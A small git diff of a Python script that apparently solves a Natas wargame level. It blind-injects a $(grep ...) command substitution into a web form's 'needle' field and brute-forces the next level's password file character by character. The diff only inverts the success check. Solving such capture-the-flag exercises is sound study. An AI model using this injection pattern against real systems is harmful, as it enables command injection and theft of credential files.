@@ -10,7 +10,7 @@ POSSIBLE_CHARS = string.ascii_letters + string.digits
 def got_results(password_prefix: str) -> bool:
     payload = f"secured$(grep -l ^{password_prefix} /etc/natas_webpass/natas17)"
     response = session.post(url, data={"needle": payload, "submit": "submit"})
-    return "secured" not in response.text
+    return "secured" in response.text
 
 
 password = ""
@@ -18,7 +18,7 @@ while True:
     found_next_char = False
 
     for ch in POSSIBLE_CHARS:
-        if got_results(password + ch):
+        if not got_results(password + ch):
             password += ch
             found_next_char = True
             break
